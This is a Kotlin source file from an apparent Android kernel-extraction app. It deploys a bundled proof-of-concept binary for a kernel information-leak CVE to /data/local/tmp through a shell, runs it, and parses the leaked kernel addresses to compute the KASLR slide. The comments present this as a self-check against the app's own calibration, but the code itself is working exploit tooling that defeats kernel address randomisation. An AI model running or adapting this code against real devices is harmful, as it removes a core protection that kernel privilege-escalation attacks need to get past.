package com.extractkit.app

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * CVE-2026-98937 泄露自检（源码：woshigenm/CVE-2026-98937 的 PoC 编译而成）。
 *
 * 这个漏洞本身只给"信息泄露"：perf 的 `exclude_kernel=1` 绕过了内核调用链的权限检查，
 * 于是普通 shell 也能拿到内核栈帧 → 反推 KASLR slide。它**不是**提权原语，
 * 但可以用来交叉验证我们自己的 tracefs 校准结果。
 */
object Cve98937Leak {

    private const val WORK = "/data/local/tmp/extract-kit"
    private const val BIN = "$WORK/poc98937"
    private const val LINK_BASE = -0x3F80000000L   // 0xffffffc080000000（6.6 系 link-time _text）
    private const val ALIGN = 0x200000L

    data class Result(
        val vulnerable: Boolean,
        val firstKernelIp: Long?,
        val frames: Int,
        val slide: Long?,
        val raw: String,
    )

    suspend fun deploy(ctx: Context): Boolean = withContext(Dispatchers.IO) {
        val bytes = runCatching { ctx.assets.open("poc98937").readBytes() }.getOrNull() ?: return@withContext false
        if (!Shell.connected() && !Shell.connect(ctx)) return@withContext false
        Shell.exec("mkdir -p $WORK")
        val (rc, _) = Shell.pushFile(BIN, bytes, executable = true)
        if (rc != 0) return@withContext false
        Shell.exec("chmod 755 $BIN")
        true
    }

    /** 跑一次 PoC（2 秒左右），解析泄露结果。 */
    suspend fun run(ctx: Context, textSize: Long = 0x2A00000L): Result = withContext(Dispatchers.IO) {
        if (!Shell.connected() && !Shell.connect(ctx)) {
            return@withContext Result(false, null, 0, null, "shell 未就绪")
        }
        val (_, out) = Shell.exec("cd $WORK && VULN_FORCE=1 $BIN 2>&1")
        val vulnerable = out.contains("VULNERABLE")
        val frames = Regex("""cc_entries=(\d+)""").find(out)?.groupValues?.get(1)?.toIntOrNull() ?: 0
        val ip = Regex("""first kernel ip: (0x[0-9a-f]+)""").find(out)
            ?.groupValues?.get(1)?.removePrefix("0x")?.toLongOrNull(16)

        // 用区间求交推 slide：S 必须让所有泄露地址落在 [_text, _text+textSize)
        var slide: Long? = null
        if (ip != null && ip > LINK_BASE) {
            val lo = ip - (LINK_BASE + textSize)   // 下界（不含）
            val hi = ip - LINK_BASE                // 上界（含）
            var first: Long = (lo / ALIGN + 1) * ALIGN
            var last: Long = (hi / ALIGN) * ALIGN
            if (first <= last && (last - first) / ALIGN <= 64) {
                slide = first
            }
            if (slide == null) slide = null
            // 用第二个/第三个帧再夹一次（取交集）
            val more = Regex("""first kernel callchain addresses: ([0-9a-fx ]+)""").find(out)
                ?.groupValues?.get(1)
                ?.trim()?.split(" ")?.mapNotNull { it.removePrefix("0x").toLongOrNull(16) } ?: emptyList()
            for (a in more) {
                if (a <= LINK_BASE) continue
                val l = a - (LINK_BASE + textSize)
                val h = a - LINK_BASE
                first = maxOf(first, (l / ALIGN + 1) * ALIGN)
                last = minOf(last, (h / ALIGN) * ALIGN)
            }
            if (first <= last) slide = first
        }
        Result(vulnerable, ip, frames, slide, out)
    }
}
